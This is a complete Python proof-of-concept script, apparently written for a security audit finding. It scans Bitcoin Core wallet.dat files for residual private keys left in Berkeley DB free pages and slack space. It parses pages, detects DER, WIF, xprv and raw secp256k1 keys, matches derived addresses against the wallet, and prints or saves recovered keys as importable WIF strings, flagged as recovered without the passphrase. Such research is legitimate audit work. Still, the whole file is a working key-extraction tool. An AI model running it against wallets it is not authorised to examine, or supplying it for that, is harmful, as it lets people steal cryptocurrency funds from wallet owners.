#!/usr/bin/env python3
"""
bdb_slack_scanner.py — Residual Key Recovery from BDB Free Pages

PoC for KL-KR-BDB-SLACK-FOUND / KLKR-N-BDB-SLACK-FOUND findings.
Scans Bitcoin Core wallet.dat files for residual private key material
left in Berkeley DB free pages that were never physically overwritten.

Supports: DER-encoded keys, WIF keys, xprv/tprv keys, raw 32-byte scalars.
"""

import struct
import hashlib
import os
import sys
import argparse
import json
import re

# ---------------------------------------------------------------------------
# secp256k1 curve parameters
# ---------------------------------------------------------------------------
SECP256K1_P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
SECP256K1_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
SECP256K1_GX = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798
SECP256K1_GY = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8
SECP256K1_A = 0
SECP256K1_B = 7

# ---------------------------------------------------------------------------
# Base58 alphabet and codec (no external dependency)
# ---------------------------------------------------------------------------
B58_ALPHABET = b"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
B58_ALPHABET_STR = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"


def b58encode(data: bytes) -> str:
    num = int.from_bytes(data, "big")
    result = []
    while num > 0:
        num, rem = divmod(num, 58)
        result.append(B58_ALPHABET_STR[rem])
    # preserve leading zero bytes
    for b in data:
        if b == 0:
            result.append("1")
        else:
            break
    return "".join(reversed(result))


def b58decode(s: str) -> bytes:
    num = 0
    for c in s:
        idx = B58_ALPHABET_STR.find(c)
        if idx < 0:
            raise ValueError(f"Invalid base58 character: {c}")
        num = num * 58 + idx
    # compute byte length
    byte_len = (num.bit_length() + 7) // 8
    result = num.to_bytes(max(byte_len, 1), "big")
    # leading '1's → leading 0x00 bytes
    pad = 0
    for c in s:
        if c == "1":
            pad += 1
        else:
            break
    return b"\x00" * pad + result


def b58check_encode(payload: bytes) -> str:
    checksum = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
    return b58encode(payload + checksum)


def b58check_decode(s: str) -> bytes:
    raw = b58decode(s)
    if len(raw) < 5:
        raise ValueError("Too short for base58check")
    payload, cksum = raw[:-4], raw[-4:]
    expected = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
    if cksum != expected:
        raise ValueError("Checksum mismatch")
    return payload


# ---------------------------------------------------------------------------
# Minimal secp256k1 point arithmetic (pure Python, PoC only)
# ---------------------------------------------------------------------------
def modinv(a, m):
    if a < 0:
        a = a % m
    g, x, _ = _extended_gcd(a, m)
    if g != 1:
        raise ValueError("No modular inverse")
    return x % m


def _extended_gcd(a, b):
    if a == 0:
        return b, 0, 1
    g, x1, y1 = _extended_gcd(b % a, a)
    return g, y1 - (b // a) * x1, x1


def point_add(p, q):
    if p is None:
        return q
    if q is None:
        return p
    x1, y1 = p
    x2, y2 = q
    if x1 == x2 and y1 != y2:
        return None
    if x1 == x2 and y1 == y2:
        lam = (3 * x1 * x1 + SECP256K1_A) * modinv(2 * y1, SECP256K1_P) % SECP256K1_P
    else:
        lam = (y2 - y1) * modinv(x2 - x1, SECP256K1_P) % SECP256K1_P
    x3 = (lam * lam - x1 - x2) % SECP256K1_P
    y3 = (lam * (x1 - x3) - y1) % SECP256K1_P
    return (x3, y3)


def point_mul(k, point=None):
    if point is None:
        point = (SECP256K1_GX, SECP256K1_GY)
    result = None
    addend = point
    while k:
        if k & 1:
            result = point_add(result, addend)
        addend = point_add(addend, addend)
        k >>= 1
    return result


def privkey_to_pubkey(scalar_bytes: bytes, compressed: bool = True) -> bytes:
    k = int.from_bytes(scalar_bytes, "big")
    if k < 1 or k >= SECP256K1_N:
        return b""
    pt = point_mul(k)
    if pt is None:
        return b""
    x, y = pt
    if compressed:
        prefix = b"\x02" if y % 2 == 0 else b"\x03"
        return prefix + x.to_bytes(32, "big")
    else:
        return b"\x04" + x.to_bytes(32, "big") + y.to_bytes(32, "big")


# ---------------------------------------------------------------------------
# Address derivation helpers
# ---------------------------------------------------------------------------
def hash160(data: bytes) -> bytes:
    return hashlib.new("ripemd160", hashlib.sha256(data).digest()).digest()


def pubkey_to_p2pkh(pubkey: bytes, testnet: bool = False) -> str:
    h = hash160(pubkey)
    version = b"\x6f" if testnet else b"\x00"
    return b58check_encode(version + h)


def scalar_to_wif(scalar: bytes, compressed: bool = True, testnet: bool = False) -> str:
    version = b"\xef" if testnet else b"\x80"
    payload = version + scalar
    if compressed:
        payload += b"\x01"
    return b58check_encode(payload)


# ---------------------------------------------------------------------------
# BDB page parsing
# ---------------------------------------------------------------------------
BDB_MAGIC_BTREE = 0x00053162  # BDB btree magic (big-endian)
BDB_MAGIC_HASH = 0x00061561

# BDB page types
P_INVALID = 0       # Invalid / free page
P_DUPLICATE = 1
P_HASH_UNSORTED = 2
P_IBTREE = 3        # Internal btree
P_LBTREE = 5        # Leaf btree
P_OVERFLOW = 7
P_HASHMETA = 8
P_BTREEMETA = 9
P_QAMMETA = 10
P_QAMDATA = 11
P_LDUP = 12
P_LRECNO = 13
P_IRECNO = 14
P_FREE = 0          # type 0 is free/invalid


def detect_page_size(data: bytes) -> int:
    """Detect BDB page size from the meta page (page 0)."""
    if len(data) < 4096:
        return 4096
    # The meta page stores page size at offset 20 (4 bytes, native endian).
    # Try both endians.
    for endian in ("<", ">"):
        ps = struct.unpack_from(endian + "I", data, 20)[0]
        if ps in (512, 1024, 2048, 4096, 8192, 16384, 32768, 65536):
            return ps
    return 4096


def parse_pages(data: bytes, page_size: int):
    """
    Yield (page_number, page_type, page_bytes) for every page.
    BDB page header (first 26 bytes on 4 KiB pages):
      offset 0:  8 bytes  LSN (log sequence number)
      offset 8:  4 bytes  pgno
      offset 12: 4 bytes  prev_pgno
      offset 16: 4 bytes  next_pgno
      offset 20: 2 bytes  entries
      offset 22: 2 bytes  hf_offset (high-water free offset)
      offset 24: 1 byte   level
      offset 25: 1 byte   type
    """
    total_pages = len(data) // page_size
    for i in range(total_pages):
        page = data[i * page_size: (i + 1) * page_size]
        if len(page) < 26:
            continue
        ptype = page[25]
        yield (i, ptype, page)


def is_free_page(page_type: int, page_bytes: bytes) -> bool:
    """Determine if a page is free / logically deleted."""
    # Type 0 is explicitly free/invalid
    if page_type == P_FREE:
        return True
    # All-zero page
    if page_bytes == b"\x00" * len(page_bytes):
        return True
    # Pages with type > 14 are unknown / likely free
    if page_type > 14:
        return True
    return False


def is_slack_region(page_type: int, page_bytes: bytes, page_size: int) -> bytes:
    """
    For non-free btree leaf/internal pages, extract the slack region
    (bytes between the last entry and hf_offset that may contain residual data).
    Returns the slack bytes or empty bytes.
    """
    if page_type not in (P_LBTREE, P_IBTREE, P_DUPLICATE, P_LDUP, P_LRECNO, P_IRECNO):
        return b""
    if len(page_bytes) < 26:
        return b""
    entries = struct.unpack_from("<H", page_bytes, 20)[0]
    hf_offset = struct.unpack_from("<H", page_bytes, 22)[0]
    # Entry index table starts at offset 26, each entry is 2 bytes
    index_end = 26 + entries * 2
    if hf_offset == 0 or hf_offset >= page_size:
        hf_offset = page_size
    # Slack is between index_end and hf_offset (if hf_offset > index_end)
    if hf_offset > index_end:
        slack = page_bytes[index_end:hf_offset]
        # Only return if it contains non-zero data
        if slack != b"\x00" * len(slack):
            return slack
    return b""


# ---------------------------------------------------------------------------
# Pattern scanners
# ---------------------------------------------------------------------------
def is_valid_scalar(scalar: bytes) -> bool:
    """Check if 32 bytes represent a valid secp256k1 private key scalar."""
    if len(scalar) != 32:
        return False
    k = int.from_bytes(scalar, "big")
    return 1 <= k < SECP256K1_N


def scan_raw_scalars(data: bytes, base_offset: int = 0):
    """Scan for any 32-byte aligned or unaligned valid secp256k1 scalars."""
    findings = []
    i = 0
    while i <= len(data) - 32:
        candidate = data[i:i + 32]
        # Quick pre-filter: skip all-zero or all-ff
        if candidate == b"\x00" * 32 or candidate == b"\xff" * 32:
            i += 1
            continue
        # Skip sequences that are clearly not key material (too many repeated bytes)
        unique_bytes = len(set(candidate))
        if unique_bytes < 8:
            i += 1
            continue
        if is_valid_scalar(candidate):
            findings.append({
                "type": "raw_scalar",
                "offset": base_offset + i,
                "hex": candidate.hex(),
                "scalar": candidate,
            })
            i += 32  # skip past this finding
        else:
            i += 1
    return findings


def scan_der_encoded(data: bytes, base_offset: int = 0):
    """
    Scan for DER-encoded EC private keys.
    Typical pattern: 0x30 <len> 0x02 0x01 0x01 0x04 0x20 <32-byte scalar> ...
    Also look for simpler DER integer wrapping: 0x02 0x20 <32 bytes>
    """
    findings = []
    # Pattern 1: Full EC private key DER structure
    # SEQUENCE { INTEGER(1), OCTET STRING(32 bytes), ... }
    i = 0
    while i < len(data) - 40:
        # Look for 0x30 (SEQUENCE tag)
        if data[i] == 0x30:
            # Try to find the private key octet string
            # 0x04 0x20 followed by 32 bytes
            search_end = min(i + 80, len(data))
            sub = data[i:search_end]
            idx = sub.find(b"\x04\x20")
            if idx >= 0 and idx + 2 + 32 <= len(sub):
                scalar = sub[idx + 2: idx + 2 + 32]
                if is_valid_scalar(scalar):
                    findings.append({
                        "type": "der_encoded",
                        "offset": base_offset + i + idx + 2,
                        "hex": scalar.hex(),
                        "scalar": scalar,
                        "der_offset": base_offset + i,
                    })
                    i += idx + 2 + 32
                    continue
        # Pattern 2: Bare DER integer 0x02 0x20 <32 bytes>
        if data[i] == 0x02 and i + 1 < len(data) and data[i + 1] == 0x20:
            if i + 2 + 32 <= len(data):
                scalar = data[i + 2: i + 2 + 32]
                if is_valid_scalar(scalar):
                    findings.append({
                        "type": "der_encoded",
                        "offset": base_offset + i + 2,
                        "hex": scalar.hex(),
                        "scalar": scalar,
                        "der_offset": base_offset + i,
                    })
                    i += 2 + 32
                    continue
        i += 1
    return findings


def scan_wif_keys(data: bytes, base_offset: int = 0):
    """Scan for WIF-encoded private keys in the raw byte stream."""
    findings = []
    # WIF keys are base58 strings: 51 chars (uncompressed) or 52 chars (compressed)
    # Starting with '5' (uncompressed mainnet), 'K' or 'L' (compressed mainnet),
    # '9' (uncompressed testnet), 'c' (compressed testnet)
    text = ""
    try:
        text = data.decode("latin-1")
    except Exception:
        return findings

    # Match potential WIF strings
    wif_pattern = re.compile(r"[5KLc9][" + re.escape(B58_ALPHABET_STR) + r"]{50,51}")
    for m in wif_pattern.finditer(text):
        candidate = m.group()
        try:
            decoded = b58check_decode(candidate)
            # Version byte 0x80 (mainnet) or 0xef (testnet)
            if decoded[0] in (0x80, 0xEF):
                if len(decoded) == 33:
                    # uncompressed
                    scalar = decoded[1:]
                elif len(decoded) == 34 and decoded[-1] == 0x01:
                    # compressed
                    scalar = decoded[1:33]
                else:
                    continue
                if is_valid_scalar(scalar):
                    findings.append({
                        "type": "wif",
                        "offset": base_offset + m.start(),
                        "hex": scalar.hex(),
                        "scalar": scalar,
                        "wif": candidate,
                    })
        except Exception:
            continue
    return findings


def scan_xprv_keys(data: bytes, base_offset: int = 0):
    """Scan for extended private keys (xprv / tprv)."""
    findings = []
    try:
        text = data.decode("latin-1")
    except Exception:
        return findings

    xprv_pattern = re.compile(r"[xt]prv[" + re.escape(B58_ALPHABET_STR) + r"]{107,112}")
    for m in xprv_pattern.finditer(text):
        candidate = m.group()
        try:
            decoded = b58check_decode(candidate)
            # xprv payload is 78 bytes: 4 version + 1 depth + 4 fingerprint +
            # 4 child + 32 chaincode + 1 (0x00) + 32 key
            if len(decoded) == 78:
                if decoded[45] == 0x00:
                    scalar = decoded[46:78]
                    if is_valid_scalar(scalar):
                        findings.append({
                            "type": "xprv",
                            "offset": base_offset + m.start(),
                            "hex": scalar.hex(),
                            "scalar": scalar,
                            "xprv": candidate,
                        })
        except Exception:
            continue
    return findings


# ---------------------------------------------------------------------------
# Address book extraction from wallet.dat
# ---------------------------------------------------------------------------
def extract_wallet_addresses(data: bytes) -> set:
    """
    Attempt to extract known addresses from the wallet.dat key/name records.
    Bitcoin Core stores address book entries with 'name' keys.
    Also look for raw pubkey hash patterns.
    """
    addresses = set()
    # Scan for base58check-encoded addresses (P2PKH: starts with 1 or m/n)
    try:
        text = data.decode("latin-1")
    except Exception:
        return addresses

    addr_pattern = re.compile(r"[1mn][" + re.escape(B58_ALPHABET_STR) + r"]{24,34}")
    for m in addr_pattern.finditer(text):
        candidate = m.group()
        try:
            decoded = b58check_decode(candidate)
            if len(decoded) == 21 and decoded[0] in (0x00, 0x6F):
                addresses.add(candidate)
        except Exception:
            continue
    return addresses


# ---------------------------------------------------------------------------
# Main scanner
# ---------------------------------------------------------------------------
def scan_wallet(wallet_path: str, address_file: str = None, output_json: str = None):
    if not os.path.isfile(wallet_path):
        print(f"[ERROR] File not found: {wallet_path}", file=sys.stderr)
        sys.exit(1)

    with open(wallet_path, "rb") as f:
        data = f.read()

    file_size = len(data)
    page_size = detect_page_size(data)
    total_pages = file_size // page_size

    # Load known addresses
    known_addresses = set()
    if address_file and os.path.isfile(address_file):
        with open(address_file, "r") as af:
            for line in af:
                addr = line.strip()
                if addr:
                    known_addresses.add(addr)

    # Also extract addresses from the wallet itself
    wallet_addresses = extract_wallet_addresses(data)
    known_addresses.update(wallet_addresses)

    # Collect free page data and slack regions
    free_pages = []
    slack_regions = []
    free_page_bytes = bytearray()
    slack_bytes_total = bytearray()

    for pgno, ptype, page in parse_pages(data, page_size):
        if is_free_page(ptype, page):
            free_pages.append(pgno)
            free_page_bytes.extend(page)
        else:
            slack = is_slack_region(ptype, page, page_size)
            if slack:
                slack_regions.append((pgno, slack))
                slack_bytes_total.extend(slack)

    # Combine all scannable data with offset tracking
    scan_regions = []
    # Free pages
    for idx, pgno in enumerate(free_pages):
        offset_in_file = pgno * page_size
        page_data = data[offset_in_file: offset_in_file + page_size]
        scan_regions.append((offset_in_file, page_data, "free_page", pgno))
    # Slack regions
    for pgno, slack in slack_regions:
        offset_in_file = pgno * page_size  # approximate
        scan_regions.append((offset_in_file, slack, "slack", pgno))

    # Run all scanners
    all_findings = []
    seen_scalars = set()

    for file_offset, region_data, region_type, pgno in scan_regions:
        for scanner in (scan_der_encoded, scan_wif_keys, scan_xprv_keys, scan_raw_scalars):
            results = scanner(region_data, base_offset=file_offset)
            for finding in results:
                scalar_hex = finding["hex"]
                if scalar_hex in seen_scalars:
                    continue
                seen_scalars.add(scalar_hex)
                finding["region_type"] = region_type
                finding["page_number"] = pgno

                # Derive address
                scalar = finding["scalar"]
                for compressed in (True, False):
                    pubkey = privkey_to_pubkey(scalar, compressed=compressed)
                    if pubkey:
                        for testnet in (False, True):
                            addr = pubkey_to_p2pkh(pubkey, testnet=testnet)
                            if addr in known_addresses:
                                finding["matched_address"] = addr
                                finding["compressed"] = compressed
                                finding["testnet"] = testnet
                                break
                        if "matched_address" in finding:
                            break

                # Always derive a default address for reporting
                if "matched_address" not in finding:
                    pubkey = privkey_to_pubkey(scalar, compressed=True)
                    if pubkey:
                        finding["derived_address"] = pubkey_to_p2pkh(pubkey, testnet=False)

                # Generate WIF if not already present
                if "wif" not in finding:
                    finding["wif_derived"] = scalar_to_wif(
                        scalar,
                        compressed=finding.get("compressed", True),
                        testnet=finding.get("testnet", False),
                    )

                # Remove raw scalar bytes from output dict (not JSON serializable)
                del finding["scalar"]
                all_findings.append(finding)

    # Categorize findings
    counts = {"der_encoded": 0, "wif": 0, "xprv": 0, "raw_scalar": 0}
    for f in all_findings:
        counts[f["type"]] = counts.get(f["type"], 0) + 1

    matched_count = sum(1 for f in all_findings if "matched_address" in f)

    # ---------------------------------------------------------------------------
    # Output report
    # ---------------------------------------------------------------------------
    print("=" * 72)
    print("  BDB FREE-PAGE RESIDUAL KEY SCANNER — PoC Report")
    print("  Finding: KL-KR-BDB-SLACK-FOUND / KLKR-N-BDB-SLACK-FOUND")
    print("=" * 72)
    print()
    print(f"  Wallet file       : {wallet_path}")
    print(f"  File size          : {file_size:,} bytes")
    print(f"  Page size          : {page_size} bytes")
    print(f"  Total pages        : {total_pages}")
    print(f"  Free pages found   : {len(free_pages)}")
    print(f"  Slack regions found: {len(slack_regions)}")
    print(f"  Free-page bytes    : {len(free_page_bytes):,}")
    print(f"  Slack bytes        : {len(slack_bytes_total):,}")
    print(f"  Known addresses    : {len(known_addresses)}")
    print()
    print("-" * 72)
    print("  PATTERN SUMMARY")
    print("-" * 72)
    print(f"  DER-encoded keys   : {counts['der_encoded']}")
    print(f"  WIF keys           : {counts['wif']}")
    print(f"  xprv/tprv keys     : {counts['xprv']}")
    print(f"  Raw 32-byte scalars: {counts['raw_scalar']}")
    print(f"  TOTAL findings     : {len(all_findings)}")
    print(f"  Address matches    : {matched_count}")
    print()

    if all_findings:
        print("-" * 72)
        print("  DETAILED FINDINGS")
        print("-" * 72)
        for idx, f in enumerate(all_findings, 1):
            print(f"\n  [{idx}] Type: {f['type'].upper()}")
            print(f"      Region     : {f['region_type']} (page {f['page_number']})")
            print(f"      Offset     : 0x{f['offset']:08X} ({f['offset']})")
            print(f"      Scalar hex : {f['hex']}")
            if "wif" in f:
                print(f"      WIF        : {f['wif']}")
            elif "wif_derived" in f:
                print(f"      WIF (deriv): {f['wif_derived']}")
            if "xprv" in f:
                print(f"      xprv       : {f['xprv']}")
            if "matched_address" in f:
                print(f"      Address    : {f['matched_address']}  *** MATCHED ***")
                print(f"      *** PRIVATE KEY RECOVERED WITHOUT PASSPHRASE ***")
            elif "derived_address" in f:
                print(f"      Address    : {f['derived_address']}  (derived, unmatched)")
            if "der_offset" in f:
                print(f"      DER start  : 0x{f['der_offset']:08X}")
        print()

    if not all_findings:
        print("  No residual key material found in free pages / slack regions.")
        print()

    print("=" * 72)
    if matched_count > 0:
        print(f"  *** {matched_count} PRIVATE KEY(S) RECOVERED WITHOUT PASSPHRASE ***")
    print("  Scan complete.")
    print("=" * 72)

    # JSON output
    if output_json:
        json_report = {
            "wallet_file": wallet_path,
            "file_size": file_size,
            "page_size": page_size,
            "total_pages": total_pages,
            "free_pages_count": len(free_pages),
            "slack_regions_count": len(slack_regions),
            "free_page_bytes": len(free_page_bytes),
            "slack_bytes": len(slack_bytes_total),
            "known_addresses_count": len(known_addresses),
            "pattern_counts": counts,
            "total_findings": len(all_findings),
            "address_matches": matched_count,
            "findings": [],
        }
        for f in all_findings:
            entry = {k: v for k, v in f.items()}
            json_report["findings"].append(entry)

        with open(output_json, "w") as jf:
            json.dump(json_report, jf, indent=2)
        print(f"\n  JSON report written to: {output_json}")


# ---------------------------------------------------------------------------
# CLI entry point
# ---------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(
        description="BDB Free-Page Residual Key Scanner for Bitcoin Core wallet.dat",
        epilog="PoC for KL-KR-BDB-SLACK-FOUND (sev 8) / KLKR-N-BDB-SLACK-FOUND (sev 8)",
    )
    parser.add_argument(
        "--wallet", required=True,
        help="Path to the wallet.dat file to scan",
    )
    parser.add_argument(
        "--addresses", default=None,
        help="Optional: file with one known address per line for matching",
    )
    parser.add_argument(
        "--output-json", default=None,
        help="Optional: path to write JSON results",
    )
    args = parser.parse_args()
    scan_wallet(args.wallet, args.addresses, args.output_json)


if __name__ == "__main__":
    main()
